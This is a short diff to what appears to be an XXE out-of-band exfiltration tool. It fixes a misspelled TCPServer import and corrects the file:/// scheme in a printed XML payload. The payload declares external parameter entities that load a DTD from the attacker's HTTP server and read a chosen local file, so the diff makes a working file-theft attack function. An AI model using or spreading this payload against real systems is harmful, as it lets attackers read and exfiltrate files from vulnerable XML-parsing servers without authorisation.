@@ -21,7 +21,7 @@ except ImportError:
     from http.server import SimpleHTTPRequestHandler
 
 try:
-    from SockerServer import TCPServer
+    from SocketServer import TCPServer
 except ImportError:
     from socketserver import TCPServer
 
@@ -222,7 +222,7 @@ def main():
                    "\n\n" % (argv.hostname, argv.http))
     elif (argv.dtd == "ftp.client_file.dtd.template" or argv.dtd == "error.client_file.dtd.template"):
         print_info("Servers started. Use the following payload (with URL-encoding):\n\n" \
-                   "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE xmlrootname [<!ENTITY %% aaa SYSTEM \"http://%s:%d/ext.dtd\"><!ENTITY %% bbb SYSTEM \"file///YOUR_FILENAME_HERE\">%%aaa;%%ccc;%%ddd;]>" \
+                   "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE xmlrootname [<!ENTITY %% aaa SYSTEM \"http://%s:%d/ext.dtd\"><!ENTITY %% bbb SYSTEM \"file:///YOUR_FILENAME_HERE\">%%aaa;%%ccc;%%ddd;]>" \
                    "\n\n" % (argv.hostname, argv.http))
     else:
         print_info("Servers started. Custom template detected, sample payload unknown.\n\n")
